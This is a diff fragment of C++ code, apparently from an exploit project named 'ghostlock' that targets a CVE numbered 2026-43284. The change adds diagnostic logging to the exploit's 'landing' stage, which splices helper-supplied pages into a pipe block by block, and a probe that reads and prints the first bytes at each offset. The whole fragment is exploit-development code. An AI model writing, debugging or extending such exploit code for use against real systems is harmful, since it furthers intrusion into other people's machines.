@@ -238,10 +238,16 @@ namespace ghostlock::backend::cve_2026_43284::landing {
                 if (!splice_span(io_, file_fd_, &cursor, fds[1], kBlockBytes)) { last_error_ = 21; break; }
             } else {
                 const long spliced = helper_.splice16(helper_.ctx, fds[1], offset);
-                /* 缺的就是这个数据点：远端页由 helper splice 进管道；它的返回值决定密文页是否有内容。 */
-                GL_LOGI("helper splice: offset=%llu spliced=%ld fd=%d helper_avail=%d",
-                        static_cast<unsigned long long>(offset), spliced, file_fd_,
-                        helper_.available() ? 1 : 0);
+                /* 并排事实：helper 送进管道的块数，以及经同一来源读该处会得到的前 4 字节。 */
+                std::uint8_t probe[16] = {};
+                const long probed = old_page_.available()
+                                   ? old_page_.read16(old_page_.ctx, offset, probe)
+                                   : -1;
+                GL_LOGI("helper splice: offset=%llu spliced=%ld probed=%ld head=%02x%02x%02x%02x fd=%d helper_avail=%d",
+                        static_cast<unsigned long long>(offset), spliced, probed,
+                        static_cast<unsigned>(probe[0]), static_cast<unsigned>(probe[1]),
+                        static_cast<unsigned>(probe[2]), static_cast<unsigned>(probe[3]),
+                        file_fd_, helper_.available() ? 1 : 0);
                 if (spliced != static_cast<long>(kBlockBytes)) { last_error_ = 22; break; }
             }
             const std::size_t suffix = size - kMinDatagramBytes;
